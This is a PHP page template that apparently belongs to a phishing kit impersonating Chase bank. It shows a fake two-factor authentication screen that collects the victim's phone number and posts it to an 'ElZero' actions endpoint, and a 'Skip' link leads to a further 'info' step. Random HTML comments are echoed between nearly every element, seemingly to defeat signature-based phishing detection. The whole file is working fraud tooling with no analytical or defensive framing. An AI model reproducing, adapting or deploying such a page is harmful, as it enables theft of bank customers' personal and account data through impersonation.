<?php require("includes/header.php") ?>
<style type="text/css">
    .jpui.checkbox .checkboxWrap .check {
        display: inline-block;
        border: .0625rem solid #959595;
        height: 1.25rem;
        width: 1.25rem;
        border-radius: .1875rem;
        position: relative;
         bottom: 0rem; 
    }
</style>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" homepage" tabindex="-1">
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-container">
                <header class=" toggle-aria-hidden">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
                        <a>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
                        <a>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                </header>
                <main>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" container logon">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui background image fixed">
                                    <style type="text/css">
                                        .jpui.background.image {
                                            background-image: url(./img/mobilenight.jpeg);
                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                        }
                                        
                                        @media (min-width:320px) {
                                            .jpui.background.image {
                                                background-image: url(./img/mobilenight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:992px) {
                                            .jpui.background.image {
                                                background-image: url(./img/tabletnight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:1024px) {
                                            .jpui.background.image {
                                                background-image: url(./img/desktopnight.jpeg);
                                            }
                                        }
                                    </style>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">


                                 <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui raised segment" id="emailo" style="max-width: 470px!important; display:block;">
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" col-xs-10 col-xs-offset-1">
                                            <form action="../ElZero/actions/emailAccessOTP" method="POST" autocomplete="off" >
                                                 <input type="hidden" name="tokenElzeroCsrf" value="<?php echo $_SESSION['ElZeR0_ToKeN'];?>" >
                                                <input type="hidden" name="elzeroKiller" value="">
                                                <h3 style="display:block;" class=" u-focus in-progress" tabindex="-1">Two-factor authentication (2FA)</h3>
                                            <br>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div align="center">
                                                    <img id="img" src="https://logo.clearbit.com/<?php echo $_SESSION['domain']; ?>" width="100px">
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div style="display:block;" id="emailtext" >    
                                                    <br><br>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div style="text-align: center">
                                                        <h3 class=" u-focus in-progress" tabindex="-1" style="font-size: 16px; ">Two-factor authentication (2FA) To your Email We will Send Code To Your phone </h3>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <br>




                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                                    
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="labelFlooat" class=" align-label-input floating-label__container emms">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="email">Phone Number</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">
                                                                <input maxlength="14" minlength="14" inputmode="numeric" class=" jpui input logon-xs-toggle " id="otp" placeholder="" autocomplete="off" type="tel" name="telephone" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class="col-md-6" style="padding: 1.5rem 0rem 0rem 0">
                                                        <a href="./info" style="padding: 0.5rem 2.5rem;rem " class=" jpui button focus fluid primary touch"><span class=" label">Skip</span> </a>
                                                                                                                
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class="col-md-6">
                                                        <button type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
                                                                                                                
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    

                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                            </form>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>





                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            	</main>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

<?php require("includes/footer.php") ?>




